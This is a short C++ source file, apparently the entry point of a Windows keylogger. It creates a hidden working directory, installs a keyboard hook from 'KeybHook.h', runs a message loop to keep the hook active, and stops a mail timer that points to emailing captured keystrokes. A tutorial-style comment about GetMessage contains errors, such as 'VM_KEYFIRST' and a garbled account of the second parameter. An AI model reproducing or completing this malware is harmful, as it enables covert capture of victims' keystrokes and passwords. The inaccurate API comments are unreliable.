#include <iostream>
#include <Windows.h>
#include "KeybHook.h"
using namespace std;

/*
Getmessage retrieves a message from the calling thread's message queue.
The function dispatches incoming sent messages until a posted message is available for retrieval.

GetMessage (&Msg, NULL, 0,0 ) //for this windows.h header is required and uses User32.dll

In windows there is a MSG structure so &Msg is address that receives message information from the thread's message queue.

if 2nd parameter is NULL that means GetMessage retrieves messages for any windows that belongs to the current thread,
and any message on the current thread's message queue whose value in NULL.
That means both windows messages and thread messages windows are processed.
If it's -1 that means GetMessage retrieves only messages on the current thread's message queue whose value is NULL

3rd parameter is the integer value of the lowest message value to be retrieved.
If it's 0 it will return all available messages. If it's VM_KEYFIRST(0x100){first keyboard message} and VM_MOUSEFIRST(0x200) for first mouse message.

4th parameter is integer value of highest message value to be retrieved.
VM_KEYLAST {last keyboard message} and VM_MOUSELAST {last mouse message}. If it's 0 that means no range filtering is performed.

Return type is BOOL

If a function retrieves a message other that WM_QUIT
{Indicates a request to terminate an application, and is generated when the application calls the PostQuitMessage function.
 This message causes the GetMessage function to return zero.}, return value is non zero

If retrieves WM_QUIT message, the return value is zero.

If there is an error it can return -1.

*/
int main ()
    {
        MSG Msg;
        IO::MkDir (IO::GetOurPath (true));
        InstalHook ();
        BOOL bRet;

        while( (bRet = GetMessage( &Msg, NULL, 0, 0 )) != 0)
            {
                if (bRet == -1)
                {
                     cout<<"Error";
                     exit(1);   // handle the error and possibly exit
                }
                else
                {
                TranslateMessage(&Msg);
                DispatchMessage(&Msg);
                }
            }
    MailTimer.Stop ();
    return 0;
    }
